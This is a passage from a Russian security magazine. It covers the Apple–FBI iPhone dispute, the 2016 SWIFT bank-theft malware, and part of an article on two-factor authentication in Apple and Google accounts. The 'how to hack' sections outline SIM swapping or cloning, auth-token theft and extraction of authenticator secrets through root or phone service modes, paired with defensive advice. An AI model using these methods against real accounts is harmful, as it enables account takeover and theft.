здать для них специальную версию iOS с бэкдором, а просили у разработчи-
ков подписанный цифровым ключом Apple образ со специальным RAM-дис-
ком (для конкретного смартфона, с проверкой уникального ID девайса).
Загрузив образ на смартфон через режим DFU, правоохранители смогли бы
обойти все ограничения, связанные с вводом PIN-кода, и, по сути, могли бы
вскрыть аппарат брутфорсом.
  В ответ на эти требования ФБР Тим Кук написал открытое письмо, обра-
щенное как к пользователям продуктов компании, так и к обществу в целом.
   «Мы относимся к работе профессионалов ФБР с глубоким почтением и ве-
рим, что ими руководят самые лучшие намерения. Вплоть до этого момента мы
делали все, что было в наших силах и в пределах закона, чтобы помочь им. Но те-
перь правительство США просит нас предоставить то, чего у нас нет, а созда-
вать это слишком опасно. Они просят нас разработать бэкдор для iPhone.
   Если говорить точнее, ФБР хочет, чтобы мы создали новую версию операци-
онной системы для iPhone, которая обойдет некоторые важные средства защи-
ты, а затем установили ее на устройство, восстановленное в ходе расследования.
Если такое ПО (которого на сегодня не существует) попадет не в те руки, оно по-
зволит разблокировать любой iPhone, если к нему есть физический доступ.
  ФБР может использовать другие слова для описания данного инструмен-
та, но создание версии iOS, которая позволит обходить средства защиты по-
добным образом, вне всякого сомнения, станет созданием бэкдора. Пра-
вительство может спорить и утверждать, что использование [данного ПО]
ограничится только этим конкретным случаем, но гарантировать это и прокон-
тролировать невозможно», — писал Тим Кук.
   Хотя с позицией главы Apple не согласились многие, включая известных пра-
возащитников, другие лидеры индустрии поддержали Кука. К примеру, глава
Google Сундар Пичаи писал в Twitter: «Мы создаем защищенные продукты, что-
бы обезопасить ваши данные, и мы предоставляем силовым структурам доступ
к данным в установленном законом порядке. Но требовать от компании предо-
ставить возможности взлома пользовательских устройств и данных — это совсем
другое. Это может стать очень непростым прецедентом». Похожую точку зрения
выразили руководители Facebook и Twitter, а Эдвард Сноуден, в свою очередь,
назвал ситуацию «самым важным технологическим делом десятилетия».
   Лишь Билл Гейтс тогда встал на сторону ФБР, заявив в интервью изданию
Financial Time: «Никто не говорил о бэкдоре. В данном случае государство
запрашивает доступ к информации. Они не просят о каком-либо общем ре-
шении, они просят [помощи] в данном конкретном случае. Это то же самое,
что запрашивать данные у телефонной компании, банковские данные».
   Сам конфликт тем временем обострился. Тон представителей Министер-
ства юстиции США изменился на почти враждебный, власти открыто угрожали
Apple, предупреждая, что готовы едва ли не силой заставить компанию принять
их требования. В марте 2016 года представители ФБР и Apple даже выступи-
ли перед конгрессом, где больше пяти часов излагали суть своего спора. Ни-
каких судьбоносных решений в этот день не принимали, конгресс просто по-
желал лучше понять ситуацию и заслушать обе стороны конфликта. Но за пять
часов набралось немало интересного. К примеру, юрисконсульт Apple назвал
Telegram опасным приложением, а глава ФБР Джеймс Коми (James Comey)
признался, что в начале расследования правоохранители сами наделали оши-
бок со смартфоном террориста и в итоге были вынуждены просить о помощи.
   Когда все уже приготовились к длительному юридическому противосто-
янию между Apple и властями, ситуация неожиданно разрешилась. В конце
марта 2016 года смартфон Фарука был успешно взломан неназванным под-
рядчиком ФБР. Как именно это было проделано, неясно до сих пор.
   Из уклончивых ответов представителей ведомства сложилась следующая
картина. Так, ФБР подтвердило, что взломать удалось лишь iPhone 5C и ис-
пользованный метод не будет работать для более поздних моделей iPhone.
Также известно, что ФБР фактически заключило разовый контракт на предо-
ставление услуги взлома с некой хакерской группой, которая имеет сомни-
тельную репутацию. Все это время СМИ называли «главным подозреваемым»
на роль подрядчика ФБР израильскую фирму Cellebrite, которая специализи-
руется на разработке программных средств и оборудования для извлечения
данных из мобильных устройств. Но, судя по всему, пресса ошиблась. Журна-
листы издания Washington Post сообщали, что неназванный подрядчик Бюро
относится скорее к gray hat хакерам, чем к «хорошим парням», и известен тем,
что торгует уязвимостями. Кроме того, сообщалось, что сами представители
ФБР могут вообще не знать о том, какими конкретно методами пользовался
подрядчик, или могут не иметь права разглашать информацию об этих мето-
дах. Затем, в апреле 2016 года, удалось выяснить, что правоохранители по-
тратили на взлом устройства огромную сумму: более миллиона долларов.
   На мероприятии Aspen Security Forum Джеймс Коми ответил на вопрос, сколь-
ко ФБР заплатило за взлом: «Много. Больше, чем я заработаю за все время служ-
бы. И по-моему, оно того стоило». Журналисты быстро подсчитали, что зарплата
главы ФБР равняется 183 300 долларов в год, и в Бюро он еще будет работать
семь лет и четыре месяца. Получается, что все эти годы службы Коми заработает
порядка 1,34 миллиона долларов, без учета всех бонусов и премий.
   Вместо заключения процитирую слова редактора ][, Евгения Зобнина, ко-
торый весной 2016 года посвятил отдельную колонку этому конфликту и очень
хорошо объяснил, почему Apple отказала властям и какую опасность могут
представлять подобные прецеденты:
   «Может показаться, что сделать инструмент для брутфорса одного-един-
ственного смартфона, да к тому же принадлежавшего убийце инвалидов, — это
даже благородно и к тому же не нарушает ничью конфиденциальность. Но есть
такое слово — прецедент. Единожды пойдя на уступки ФБР, Apple как бы под-
твердит: „Да, мы можем создать инструмент для взлома чужих смартфонов,
если на нас надавить“, и в своем обращении Тим Кук абсолютно верно подме-
тил, что существует вполне реальная вероятность, что правительство пойдет
еще дальше и в следующий раз действительно попросит встроить бэкдор в iOS,
а затем и функцию прослушивания звонков. И все это опять же в благих целях.
   За примерами далеко ходить не надо. Все мы помним, как родилась идея
блокировки российских сайтов без суда и следствия. Очень благая цель —
борьба с детской порнографией, которая якобы появляется и исчезает в Сети
так быстро, что к моменту, когда суд вынесет решение, чайлдпорносайт уже
будет закрыт и появится в другом месте. К чему привела такая якобы хорошая
инициатива, ты и сам знаешь».


Другие интересные материалы по данной теме:
• 87% заблокированных устройств, попавших в руки ФБР, были
  успешно взломаны
• Независимый исследователь утверждает, что за взлом iPhone террориста
  можно было не платить миллион долларов
• Брокеры уязвимостей готовы платить за баги в iOS дороже самой Apple,
  до 500 тысяч долларов
• Джон Макафи попытался пропиариться на резонансном споре Apple и ФБР,
  но сел в лужу





                           Продолжение статьи
    Начало статьи
ВСЕ САМОЕ ИНТЕРЕСНОЕ
 ЗА 2016 ГОД
   ДАЙДЖЕСТ САМЫХ ЗАМЕТНЫХ И ИНТЕРЕСНЫХ
        СОБЫТИЙ ЗА ПРОШЕДШИЙ ГОД



АТАКИ НА SWIFT
В начале февраля 2016 года неустановленные хакеры сумели получить до-
ступ к средствам Центрального банка Бангладеш, который держит счет в Фе-
деральном резервном банке Нью-Йорка (является частью Федеральной ре-
зервной системы США). Неизвестные успешно похитили 81 миллион долларов
и только чудом не сумели украсть у ЦБ Бангладеш почти миллиард: афера рас-
крылась из-за допущенной хакерами опечатки. Похищенные деньги затеря-
лись на счетах в Шри-Ланке и Филиппинах.
  В апреле 2016 года специалисты по информационной безопасности
из британской военно-промышленной корпорации BAE Systems обнаружи-
ли троян, который и помог злоумышленникам похитить 81 миллион долларов.
Оказалось, что малварь модифицировала программное обеспечение, при по-
мощи которого ограбленный банк подключался к межбанковской сети SWIFT
(Society for Worldwide Interbank Financial Telecommunication, «Общество все-
мирных межбанковских финансовых каналов связи»).
  В докладе BAE Systems сообщалось, что злоумышленники установи-
ли на сервер Центробанка Бангладеш вредоносную программу evtdiag.exe,
специально разработанную для данного ограбления. Программа отыскала
одну из динамических библиотек приложения Alliance Access, посредством
которого банки взаимодействуют со SWIFT, и поменяла там всего два байта.
В результате приложение Alliance Access перестало проверять совершаемые
транзакции, а малварь принялась отслеживать сообщения, проходящие че-
рез сеть SWIFT. Это позволяло злоумышленникам удалять транзакции или ме-
нять суммы, информация о которых сохраняется в базе данных Alliance Access.
Кроме того, evtdiag.exe мешал распечатывать информацию о транзакциях зло-
умышленников, чтобы у банка вообще не осталось письменных свидетельств
ограбления.
   Тогда представители межбанковской сети SWIFT заявили, что малварь
не нанесла их системам непосредственного вреда. Организация обновила
ПО, чтобы затруднить подобные атаки в будущем, а также составила список
рекомендаций, которым необходимо следовать, чтобы избежать повторения
бангладешского сценария.
   Но уже в середине мая 2016 года стало ясно, что инцидент с Центробан-
ком Бангладеш не был уникальным. Сначала о том, что Центральный банк
Бангладеш был не единственной жертвой атак, сообщили представители BAE
Systems, которые продолжали расследовать случившееся. Затем эту инфор-
мацию подтвердил и сам генеральный директор SWIFT Готфрид Лейбрандт
(Gottfried Leibbrandt), сообщив, что «этот случай не был первым и вряд ли ста-
нет последним».
   Новый отчет экспертов BAE Systems гласил, что вредоносное ПО, исполь-
зованное при ограблении центрального банка Бангладеш, напрямую связано
с атаками на компанию Sony в 2014 году. Исследователи заметили, что в обо-
их случаях для разработки ПО использовался исключительно Visual C++ 6.0,
а код малвари слишком схож, чтобы считать это простым совпадением. Так-
же исследователи сообщили, что от аналогичных атак пострадал и неназван-
ный вьетнамский банк. Представители BAE Systems согласны с официальной
позицией SWIFT: судя по всему, злоумышленники хорошо знали, что делают,
и понимали, как работают системы банков. К примеру, в случае с вьетнамским
банком вредоносное ПО умело подделывало PDF-файлы, использовавшиеся
для валидации операций.
  В мае 2016 года свое видение ситуации изложили и специалисты Symantec,
в целом выразив согласие с выводами BAE Systems. Так, обе компании за-
метили, что в файле moutc.exe можно найти куски кода, хорошо знакомые
им с 2014 года. Три года назад для атак на компанию Sony хакерская группа
Lazarus использовала родственную этой малварь. Исследователи также отме-
тили, что функция заметания следов, призванная уничтожить все признаки ак-
тивности вредоноса в зараженной системе, тоже выглядит очень знакомо.
   Специалисты Symantec сумели связать троян Trojan.Banswift, использо-
ванный при атаке на Центробанк Бангладеш, с малварью Backdoor.Contopee,
которая в последние годы часто применялась для атак на финансовые учреж-
дения в странах Юго-Восточной Азии наряду с Backdoor.Fimlis и Backdoor.
Fimlis.B. Ранее экспертам уже удалось соотнести код Backdoor.Contopee
с другим вредоносом — Backdoor.Destover, который служит одним из основ-
ных «рабочих инструментов» той самой группы Lazarus. Для тех, кто уже запу-
тался в разнообразии малвари, ниже есть наглядная иллюстрация.





Между тем сама межбанковская система SWIFT продолжила испытывать труд-
ности. Стало известно, что, помимо Центробанка Бангладеш, от рук хакеров
пострадал эквадорский Banco del Austro, у которого, по данным Reuters, зло-
умышленники похитили 12,2 миллиона долларов. Также кражи чудом избежал
вьетнамский банк Tien Phong — во всяком случае, официальные представите-
ли банка сообщили, что успешно отразили атаку через систему SWIFT. Более
того, эксперты компании FireEye, которые тоже занялись расследованием слу-
чившегося, обнаружили атаки с аналогичным почерком, от которых пострада-
ло еще двенадцать неназванных банков в странах Юго-Восточной Азии.
  В июле 2016 года издание «Известия» со ссылкой на собственные источни-
ки, близкие к Центробанку РФ, сообщило, что российские банки тоже подверга-
ются атакам через международную банковскую систему SWIFT. По данным изда-
ния, ущерб от действий хакеров уже составляет порядка двух миллионов евро.
   Когда эта история только начиналась, руководство SWIFT уверенно заяв-
ляло, что все проблемы были исключительно на стороне банков, а их вины
в случившемся нет. Вскоре стало ясно, что проблем с безопасностью у SWIFT
предостаточно. В результате в мае 2016 года разработчики SWIFT запозда-
ло ввели в работу систему двухфакторной аутентификации для банков и поо-
бещали запрашивать «больше данных» у своих клиентов. Также представите-
ли организации обещали, что появятся некие «дополнительные инструменты»
для мониторинга происходящего и будет произведен аудит фреймворков.
   Но похоже, проблемы SWIFT еще весьма далеки от завершения. К примеру,
в ноябре 2016 года специалисты компании Symantec предупредили, что бан-
ки — клиенты международной системы SWIFT вновь стали мишенью для злоу-
мышленников. При этом новая малварь (Trojan.Odinaff), найденная исследова-
телями, судя по всему, была связана с известной хакерской группой Carbanak,
похитившей более миллиарда долларов у различных финансовых организаций
(преимущественно — российских банков) в 2014–2015 годах.
    Trojan.Odinaff распространяется посредством направленного фишинга. Ха-
керы атакуют тщательно отобранных индивидов, упаковывая малварь в специ-
ально созданные документы Word или архивы RAR. Как только жертва откры-
вает вредоносный файл и малварь проникает в систему, злоумышленники
получают идеальный бэкдор, а также практически полный контроль над зара-
женной машиной.
    Trojan.Odinaff способен делать снимки экрана и собирать другие данные
о системе, постоянно передавая их на управляющий сервер, также он может
выполнять shell-команды, скачивать и устанавливать на машину дополнитель-
ное вредоносное ПО и так далее. Эксперты Symantec рассказали, что в чис-
ле инструментов, которые устанавливает вредонос, есть сборщик паролей
Mimikatz, тулкит PsExec, сетевой сканер Netscan, приложение для удаленно-
го администрирования Ammyy Admin, а также Runas для запуска процессов
от имени другого пользователя.
   Однако в данном случае интерес представляла даже не сама функцио-
нальность вредоноса. Специалисты Symantec обратили внимание, что иногда
Trojan.Odinaff скачивает и устанавливает на зараженную машину бэкдор Batel.
Этот инструмент ранее применяли в своих вредоносных кампаниях хакеры
из известной группировки Carbanak. Также эксперты выявили три IP-адреса
управляющих серверов, которые тоже использовались Carbanak.
   Компания Symantec обнаружила доказательства того, что группа, стоя-
щая за Odinaff, ведет атаки на клиентов SWIFT и при помощи вредоносного
ПО скрывает SWIFT-сообщения о мошеннических транзакциях. Хакеры ис-
пользуют инструмент для мониторинга клиентских локальных логов сообще-
ний, который по ключевым словам ищет там определенные транзакции. Затем
такие логи перемещаются за пределы локального окружения SWIFT.
   При этом эксперты заверили: Trojan.Odinaff вряд ли имеет какое-то отно-
шение к перечисленным атакам на десятки банков. Ответственность за те ин-
циденты специалисты по-прежнему возлагают на хакерскую группу Lazarus,
которая определенно не разрабатывала Trojan.Odinaff.


 Другие интересные материалы по данной теме:
 • Летом 2016 года представители ФСБ и МВД России, при со-
   действии «Лаборатории Касперского» и Сбербанка,
  задержали создателей банковского трояна Lurk
 • Массовые ограбления банков на Тайване и в Таиланде: злоумышленники
   обчистили сразу несколько тысяч банкоматов
 • Преступники все чаще применяют для взлома банкоматов
   взрывчатку, а не малварь
COVERSTORY
ДВОЙНОЕ
ПОДТВЕРЖДЕНИЕ


    ИЗУЧАЕМ И ВЗЛАМЫВАЕМ ДВУХФАКТОРНУЮ
        АУТЕНТИФИКАЦИЮ ANDROID, IOS
            И WINDOWS 10 MOBILE





                                            Олег Афонин,
                                               Эксперт по мобильной
                                             криминалистике компании
                                                 Элкомсофт
                                                    aoleg@voicecallcentral.com

Пароли не взламывает только ленивый. Недавняя массо-
вая утечка учетных записей из Yahoo только подтверждает
тот факт, что одного лишь пароля — и совершенно неваж-
но, какой он будет длины и сложности, — уже недостаточ-
но для надежной защиты. Двухфакторная аутентифика-
ция — это то, что обещает дать такую защиту, добавляя
дополнительный уровень безопасности.

В теории все выглядит неплохо, да и на практике, в общем-то, работает. Двух-
факторная аутентификация действительно усложняет взлом учетной записи.
Теперь злоумышленнику недостаточно выманить, украсть или взломать основ-
ной пароль. Для входа в учетную запись необходимо ввести еще и одноразо-
вый код, который... А вот каким именно образом получается этот одноразовый
код — и есть самое интересное.
  Ты неоднократно сталкивался с двухфакторной аутентификацией, даже
если никогда не слышал о ней. Когда-нибудь вводил одноразовый код, кото-
рый тебе присылали через СМС? Это оно, частный случай двухфакторной ау-
тентификации. Помогает? Честно говоря, не очень: злоумышленники уже нау-
чились обходить и этот вид защиты.
   Сегодня мы рассмотрим все виды двухфакторной аутентификации, при-
меняемой для защиты учетных записей Google Account, Apple ID и Microsoft
Account на платформах Android, iOS и Windows 10 Mobile.

APPLE
Впервые двухфакторная аутентификация появилась в устройствах Apple
в 2013 году. В те времена убедить пользователей в необходимости дополни-
тельной защиты было непросто. В Apple не стали и стараться: двухфакторная
аутентификация (получившая название двухэтапной проверки, или Two-Step
Verification) использовалась только для защиты от прямого финансового ущер-
ба. Например, одноразовый код требовался при совершении покупки с ново-
го устройства, смене пароля и для общения со службой поддержки на темы,
связанные с учетной записью Apple ID.
  Добром это все не кончилось. В августе 2014 года произошла массовая
утечка фотографий знаменитостей. Хакеры сумели получить доступ к учетным
записям жертв и скачали фото из iCloud. Разразился скандал, в результате ко-
торого Apple в спешном порядке расширила поддержку двухэтапной проверки
на доступ к резервным копиям и фотографиям в iCloud. В это же время в ком-
пании продолжались работы над методом двухфакторной аутентификации но-
вого поколения.

Двухэтапная проверка
Для доставки кодов двухэтапная проверка использует механизм Find My Phone,
изначально предназначенный для доставки push-уведомлений и команд блоки-
ровки в случае потери или кражи телефона. Код выводится поверх экрана бло-
кировки, соответственно, если злоумышленник добудет доверенное устрой-
ство, он сможет получить одноразовый код и воспользоваться им, даже не зная
пароля устройства. Такой механизм доставки — откровенно слабое звено.
   Также код можно получить в виде СМС или голосового звонка на зареги-
стрированный телефонный номер. Такой способ ничуть не более безопасен.
SIM-карту можно извлечь из неплохо защищенного iPhone и вставить в любое
другое устройство, после чего принять на нее код. Наконец, SIM-карту можно
клонировать или взять у сотового оператора по поддельной доверенности —
этот вид мошенничества сейчас приобрел просто эпидемический характер.
   Если же у тебя нет доступа ни к доверенному iPhone, ни к доверенному
телефонному номеру, то для доступа к учетной записи нужно использовать
специальный 14-значный ключ (который, кстати, рекомендуется распечатать
и хранить в безопасном месте, а в поездках — держать при себе). Если же
ты потеряешь и его, то мало не покажется: доступ в учетную запись может быть
закрыт навсегда.

Насколько это безопасно?
Если честно, не очень. Двухэтапная проверка реализована из рук вон плохо
и заслуженно получила репутацию худшей системы двухфакторной аутентифи-
кации из всех игроков «большой тройки». Если нет другого выбора, то двухэ-
тапная проверка — это все же лучше, чем ничего. Но выбор есть: с выходом
iOS 9 Apple представила совершенно новую систему защиты, которой дали
бесхитростное название «двухфакторная аутентификация».
  В чем именно слабость этой системы? Во-первых, одноразовые коды, до-
ставленные через механизм Find My Phone, отображаются прямо на экра-
не блокировки. Во-вторых, аутентификация на основе телефонных номеров
небезопасна: СМС могут быть перехвачены как на уровне провайдера, так
и заменой или клонированием SIM-карты. Если же есть физический доступ
к SIM-карте, то ее можно просто установить в другое устройство и получить
код на совершенно законных основаниях.
   Также имей в виду, что преступники научились получать SIM-карты взамен
«утерянных» по поддельным доверенностям. Если твой пароль украли, то уж
узнать твой номер телефона — плевое дело. Подделывается доверенность,
получается новая SIM-карта — собственно, для доступа к твоей учетной запи-
си больше ничего и не требуется.

Как взломать
Взломать этот вариант двухфакторной аутентификации достаточно несложно.
Есть несколько вариантов:
•  считать одноразовый код с доверенного устройства — разблокировать
   не обязательно;
•  переставить SIM-карту в другой аппарат, получить СМС;
•  клонировать SIM-карту, получить код на нее;
•  воспользоваться двоичным маркером аутентификации, скопированным
   с компьютера пользователя.

Как защититься
Защита с помощью двухэтапной проверки несерьезна. Не используй ее вооб-
ще. Вместо нее включи настоящую двухфакторную аутентификацию.

Двухфакторная аутентификация
Вторая попытка Apple носит официальное на-
звание «двухфакторная аутентификация». Вме-
сто того чтобы сменить предыдущую схему
двухэтапной проверки, две системы существу-
ют параллельно (впрочем, в рамках одной учет-
ной записи может использоваться лишь одна
из двух схем).
   Двухфакторная аутентификация появилась
как составная часть iOS 9 и вышедшей одно-
временно с ней версии macOS. Новый метод
включает дополнительную проверку при любой
попытке зайти в учетную запись Apple ID с но-
вого устройства: на все доверенные устройства
(iPhone, iPad, iPod Touch и компьютеры под
управлением свежих версий macOS) момен-
тально приходит интерактивное уведомление.
Чтобы получить доступ к уведомлению, нужно
разблокировать устройство (паролем или дат-
чиком отпечатка пальцев), а для получения од-
норазового кода потребуется нажать на кнопку
подтверждения в диалоговом окне.
   Как и в предыдущем методе, в новой схе-
ме возможно получение одноразового пароля           Включение
                                                         двухфакторной
в виде СМС или голосового звонка на дове-                                                        аутентификации
ренный телефонный номер. Однако, в отличие
от двухэтапной проверки, пользователю в лю-
бом случае будут доставлены push-уведомления, и неавторизованную попытку
зайти в учетную запись пользователь может заблокировать с любого из своих
устройств.





                  Уведомление о попытке войти в учетную запись

Поддерживаются и пароли приложений. А вот от кода восстановления доступа
в Apple отказались: если ты потеряешь свой единственный iPhone вместе с до-
веренной SIM-картой (которую по каким-то причинам не сможешь восстано-
вить), для восстановления доступа к учет-
ной   записи   тебе   придется   пройти
настоящий квест с подтверждением лично-
сти (и нет, скан паспорта таким подтверж-
дением не является... да и оригинал, что на-
зывается, «не канает»).
   Зато в новой системе защиты нашлось
место для удобной и привычной офлайно-
вой схемы генерации одноразовых кодов.
Для нее используется совершенно стан-
дартный механизм TOTP (time-based one-
time password), который каждые тридцать
секунд генерирует одноразовые коды, со-
стоящие из шести цифр. Эти коды привя-
заны к точному времени, а в роли генера-
тора  (аутентификатора)  выступает  само
доверенное устройство. Коды добывают-
ся из недр системных настроек iPhone или
iPad через Apple ID   Password and Security.
  Мы не станем подробно  объяснять,
что такое TOTP и с чем его едят, но об ос-
новных отличиях реализации этого мето-
да в iOS от аналогичной схемы в Android
и Windows рассказать все-таки придется.                                                         Получаем
  В отличие  от основных  конкурентов,              одноразовый
Apple позволяет использовать в качестве                   код
аутентификаторов исключительно устрой-
ства собственного производства. В их роли
могут выступать доверенные iPhone, iPad или iPod Touch под управлением iOS
9 или 10. При этом каждое устройство инициализируется уникальным секре-
том, что позволяет в случае его утраты легко и безболезненно отозвать с него
(и только с него) доверенный статус. Если же скомпрометирован окажется ау-
тентификатор от Google, то отзывать (и заново инициализировать) придется
статус всех инициализированных аутентификаторов, так как в Google решили
использовать для инициализации единственный секрет.

Насколько это безопасно
В сравнении с предыдущей реализацией новая схема все же более безопас-
на. Благодаря поддержке со стороны операционной системы новая схема бо-
лее последовательна, логична и удобна в использовании, что немаловажно
с точки зрения привлечения пользователей. Система доставки одноразовых
паролей также существенно переработана; единственное оставшееся слабое
звено — доставка на доверенный телефонный номер, который пользователь
по-прежнему должен верифицировать в обязательном порядке.
   Теперь при попытке входа в учетную запись пользователь мгновенно полу-
чает push-уведомления на все доверенные устройства и имеет возможность
отклонить попытку. Тем не менее при достаточно быстрых действиях злоумыш-
ленник может успеть получить доступ к учетной записи.

Как взломать
Так же как и в предыдущей схеме, двухфакторную аутентификацию можно
взломать с помощью маркера аутентификации, скопированного с компьютера
пользователя. Атака на SIM-карту тоже сработает, но попытка получить код че-
рез СМС все же вызовет уведомления на всех доверенных устройствах поль-
зователя, и он может успеть отклонить вход. А вот подсмотреть код на экране
заблокированного устройства уже не удастся: придется разблокировать де-
вайс и дать подтверждение в диалоговом окне.





             Извлечь маркер аутентификации с компьютера можно с по-
                     мощью Elcomsoft Phone Breaker

Как защититься
Уязвимостей в новой системе осталось не так много. Если бы Apple отказа-
лась от обязательного добавления доверенного телефонного номера (а
для активации двухфакторной аутентификации хотя бы один телефонный но-
мер верифицировать придется в обязательном порядке), ее можно было бы
назвать идеальной. Увы, необходимость верифицировать телефонный номер
добавляет серьезную уязвимость. Попытаться защититься можно точно так же,
как ты защищаешь номер, на который приходят одноразовые пароли от банка.

GOOGLE
Google защищает учетные записи пользователя с помощью двухфакторной ау-
тентификации уже очень давно. Пользователям доступно множество способов
получения одноразовых паролей и других методов подтверждения аутентич-
ности запроса на вход в учетную запись.

Аутентификация через СМС
Одноразовые коды могут быть высланы в СМС или звонком на верифициро-
ванный номер. В целом система работает так же, как у Apple, за одним исклю-
чением: Google не заставляет пользователей в обязательном порядке добав-
лять номер телефона, чтобы активировать двухфакторную аутентификацию.
Кроме того, push-уведомления на доверенные устройства приходят пользова-
телям только в том случае, если в явном виде настроен вариант аутентифика-
ции с помощью телефона (Google Prompt, о нем ниже).

Одноразовые коды TOTP
Мы уже рассмотрели систему на основе time-based one-time passwords (TOTP)
на примере Apple. В отличие от Apple, в Google придерживаются полити-
ки максимальной открытости. Компания использует совершенно стандарт-
ную реализацию протокола, позволяющую инициализировать приложения-а-
утентификаторы  как  разработки самой
Google (приложение Google Authenticator,
так  и  сторонние  (например,  Microsoft
Authenticator). Благодаря этому двухфак-
торная аутентификация  становится  до-
ступна пользователям практически всех
платформ.
   Для инициализации приложения-аутен-
тификатора Google использует QR-код, ко-
торый нужно сканировать с помощью но-
вого устройства. В отличие от Apple, здесь
используется  единственный  разделяе-
мый секрет: с помощью одного и того же
QR-кода можно активировать любое коли-
чество приложений-аутентификаторов.
  С одной стороны, это удобно: можно
сохранить QR-код в виде изображения
(достаточно сделать скриншот  экрана),
после чего использовать его для инициа-
лизации  приложений-аутентификаторов
на новых устройствах. С другой — ото-
звать доверенный статус с конкретного
устройства не представляется возмож-
ным. Отозвать можно только все сразу
в процессе генерации нового QR-кода.                                                                Google Authenticator
   Насколько безопасна аутентификация
TOTP?
   Алгоритм TOTP — стандарт в индустрии. Существует множество приложе-
ний-аутентификаторов, использующих этот алгоритм. А вот реализация TOTP
для Android (а точнее — особенности самой системы Android) открывает по-
тенциальные уязвимости, которых нет на других платформах:
•  если на устройстве есть root, извлечь секрет из приложения Authenticator —
   дело нескольких минут;
•  если загрузчик устройства разблокирован (в частности, практически все
   устройства на основе наборов системной логики MediaTek поставляются
   с незаблокированными загрузчиками), извлечь данные из устройства —
   дело нескольких минут (если не активировано шифрование).

Аутентификация с помощью телефона — Google Prompt
Google Prompt (в компании так и не смогли адекватно перевести название
на русский язык, ограничившись термином «аутентификация с помощью теле-
фона») — способ проверки в виде интерактивного уведомления, которое до-
ставляется на доверенные устройства. В отличие от push-уведомлений Apple,
здесь нет никаких кодов: пользователю просто предлагают подтвердить или
отклонить попытку входа в учетную запись.
   Пожалуй, этот вид двухфакторной ау-
тентификации наиболее удобен для обыч-
ного пользователя. Отреагировать на за-
прос гораздо проще, чем генерировать
и сканировать QR-код, открывать при-
ложение-аутентификатор,  вводить  ше-
стизначный код. Разумеется, работает эта
схема только в том случае, если у дове-
ренного устройства есть связь с сервером
Google. Если это не так, то всегда можно
воспользоваться любым другим способом
аутентификации — например, ввести код
из приложения-аутентификатора.
  Еще раз отметим важные различия
между Google Prompt и push-уведомле-
ниями в двухфакторной аутентификации
Apple. Если Apple шлет на доверенное
устройство шестизначный  код, который
потребуется ввести на втором шаге ау-
тентификации, то Google отправляет про-
стой запрос «да — нет», который доста-
точно просто подтвердить на доверенном
устройстве.
   Другое важное отличие в методе до-                                                 Диалоговое окно Google Prompt
ставки уведомлений: если Apple полно-
стью контролирует экосистему и может
использовать встроенные в ОС механизмы для доставки сообщений, то в слу-
чае с Android мы имеем разнообразие версий и вариаций системы. Если
учесть скорость обновлений Android у подавляющего числа производителей,
у недавно разработанной системы аутентификации Google Prompt были все
шансы остаться невостребованной в течение последующих двух-трех лет.
   Поэтому в Google поступили иначе. Интерактивные уведомления доставля-
ются по протоколу Google Cloud Messaging (GCM), а принимают эти уведомле-
ния либо Google Play Services (на Android), либо приложение Google (на iOS).
На этом моменте нужно заострить внимание. В отличие от «бесплатной ОС с от-
крытым исходным кодом», как позиционируется Android, Google Play Services
полностью контролирует компания Google. Эти сервисы автоматически поддер-
живаются в актуальном состоянии на всех устройствах под управлением Android
(начиная с версии 2.3). Соответственно, с появлением нового механизма аутен-
тификации доступ к нему сразу получили практически все пользователи.
  Мы смогли протестировать работу этого механизма на устройствах, рабо-
тающих под управлением Android 5.1, 6.0, 7.0 и 7.1. Как начальная настрой-
ка, так и последующая работа Google Prompt не вызывают вопросов. При этом
мы смогли корректно настроить Google Prompt во время начальной настрой-
ки даже на еще не активированных устройствах под управлением Android 5.1
(Google Prompt в те времена не существовало). Вполне вероятно, что Google
Play Services получают первое обновление еще на этапе настройки телефона
после того, как пользователь установит сетевое соединение, и до того, как бу-
дут запрошены логин и пароль пользователя от учетной записи Google.
   Доверенный статус Google Prompt можно отзывать независимо как из учет-
ной записи Google через веб-браузер, так и с самого устройства.

Распечатка одноразовых кодов
Двухфакторная аутентификация начиналась с одноразовых кодов, распеча-
танных на листе бумаги. Этот вариант доступен пользователям Google. Распе-
чатать можно десяток шестизначных одноразовых кодов. В любой момент все
неиспользованные коды можно отозвать, просто сгенерировав новые. Фор-
мат распечатки совпадает с размерами стандартной визитки. Коды можно по-
ложить в бумажник и носить с собой. У таких кодов нет определенного срока
действия; они остаются действительными до использования или до момента
генерации нового набора кодов.

Google Security Key
Этот вид аутентификации уникален для Google. Впрочем, область его применения
весьма ограничена. Универсальные ключи FIDO Universal 2nd Factor (U2F) можно
использовать исключительно для верификации в браузере Google Chrome и толь-
ко на компьютерах (ноутбуках, хромбуках и планшетах) с поддержкой USB.


  Настройка
  двухфакторной
  аутентификации
  с помощью
  Google Security
  Key





Пароли приложений
Google использует уникальные пароли для приложений, которые не поддержи-
вают двухфакторную аутентификацию. К таким относятся, например, почтовые
клиенты IMAP (включая старые версии Microsoft Outlook). Пароли генерируют-
ся по запросу и могут быть отозваны в любой момент в индивидуальном по-
рядке. Ограничений на число активных паролей нет.
  С помощью паролей приложений можно получить лишь ограниченный до-
ступ к некоторым типам данных. Так что воспользоваться сервисом Google
Takeout для извлечения информации из учетной записи с помощью такого па-
роля не удастся. Не получится и зайти в учетную запись с помощью браузера:
система запросит пароль от аккаунта, после чего потребует ввести одноразо-
вый код.

Как взломать
В зависимости от того, какие именно возможности из перечисленных выше
активны у пользователя, доступны следующие способы атаки.
•  Если установлено приложение-аутентификатор: извлечь данные приложе-
   ния, используя root или кастомный рекавери (к примеру, TWRP) либо исполь-
   зуя режим сервисного обслуживания телефона (для Qualcomm — режим
   9006 либо 9008, для MTK — SP Flash Tool, для всех телефонов LG — ре-
  жим прямого доступа к памяти по протоколу LGUP). Последние два способа
   не сработают, если память телефона зашифрована.
•  Если используется доставка кодов на SIM-карту: извлечь SIM-карту, вста-
   вить в другое устройство, профит. Или использовать любой другой меха-
   низм атаки для перехвата СМС.

Как защититься
Если для генерации одноразовых кодов используется приложение-аутентифика-
тор, не поленись и зашифруй раздел данных. Это пригодится, честное слово! Обя-
зательно используй безопасную блокировку экрана (PIN-код). Не используй Smart
Lock (разблокировка по местоположению, по фотографии лица и подобные).
  По возможности не используй доставку одноразовых кодов через СМС.
   Следуя этим простым правилам, можно обезопасить свою учетную запись
в достаточной степени. Если же ты не используешь безопасную блокиров-
ку экрана и шифрование раздела данных, то все прочие меры «безопасно-
сти» будут направлены исключительно на успокоение твоей нервной системы,
но никак не на усиление безопасности как таковой.

MICROSOFT
Двухфакторная аутентификация Microsoft защищает вход в Microsoft Account
